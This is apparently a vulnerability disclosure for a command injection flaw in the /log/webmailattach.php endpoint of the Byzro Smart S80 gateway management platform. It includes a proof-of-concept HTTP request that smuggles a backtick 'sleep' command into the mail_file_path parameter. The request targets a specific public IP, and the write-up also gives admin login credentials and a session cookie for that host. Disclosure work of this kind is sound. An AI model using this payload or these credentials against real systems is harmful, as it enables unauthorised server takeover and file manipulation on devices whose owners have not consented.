Byzro Networks Smart S80 management platform has rce vulnerability

# Vulnerability description

Beijing Baizhuo Network Technology Co., Ltd. (hereinafter referred to as Baizhuo Network) is a high-tech enterprise dedicated to building the next generation of secure Internet.
Byzro Networks Smart S80 gateway intelligent management platform has rce vulnerability. An attacker can exploit the vulnerability to gain server permissions and manipulate server files.

# Impact versions of vulnerabilities

Smart S80

# Vulnerability location

/log/webmailattach.php

# Details of the vulnerability

The mail_file_path parameter in the code is controllable and is directly brought to the command execution function exec to execute the command, causing the command to be executed.

<a href="https://smms.app/image/EBJoAW1SbdgDvmz" target="_blank"><img src="https://s2.loli.net/2024/03/28/EBJoAW1SbdgDvmz.png" ></a>

The following is a recurrence of the vulnerability

Ip：https://125.67.126.126:8443/

Here is the login page，username is admin and password is 20015480.

<a href="https://smms.app/image/5nSTZyD3idkwYf9" target="_blank"><img src="https://s2.loli.net/2024/03/28/5nSTZyD3idkwYf9.png" ></a>

Construct a POC and perform delay testing through the sleep function

```
GET /log/webmailattach.php?table_name=777&mail_file_path=12`sleep%205`4  HTTP/1.1
Host: 125.67.126.126:8443
Cookie: PHPSESSID=eb590380ff7db31711aeffe1f3365b06
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

<a href="https://smms.app/image/lSvfeKjHN82ABFL" target="_blank"><img src="https://s2.loli.net/2024/03/28/lSvfeKjHN82ABFL.png" ></a>

